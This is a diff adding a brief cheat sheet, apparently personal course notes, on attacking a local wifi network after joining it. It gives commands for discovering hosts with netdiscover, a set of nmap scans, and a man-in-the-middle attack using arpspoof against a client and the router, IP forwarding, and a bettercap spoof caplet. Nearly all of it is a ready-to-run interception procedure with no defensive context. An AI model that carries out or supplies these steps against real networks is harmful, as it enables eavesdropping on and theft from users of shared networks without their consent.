@@ -1,0 +1,20 @@
+///POST CONNECTION///
+Discover Clients on Same Network:
+- netdiscover -r (IP address of adapter in Managed and connected to wifi, disable ethernet connect. Ex. 192.168.0.1/24)
+
+Nmap Guide:
+- Intense Scan: 	nmap -T4 -A -v (IP range)
+- Ping Scan (Quick): 	nmap -sn (IP range)
+- Quick Scan: 		nmap -T4 -F (IP range)
+- Quick Scan Plus: 	nmap -sV -T4 -O -F --version-light (IP range)
+
+---MITM Attack---
+ARP Spoofing:
+- arp -a (Displays ARP table)
+- arpspoof -i (Adapter connected to WiFi) -t (Client IP) (Router IP)
+- Run above command twice but switch IPs
+Enable Port-Forwarding:
+- echo 1 > /proc/sys/net/ipv4/ip_forward
+Bettercap:
+- Edit spoof.cap with target IPs
+- bettercap -iface (Adapter connected to WiFi) -capulet spoof.cap
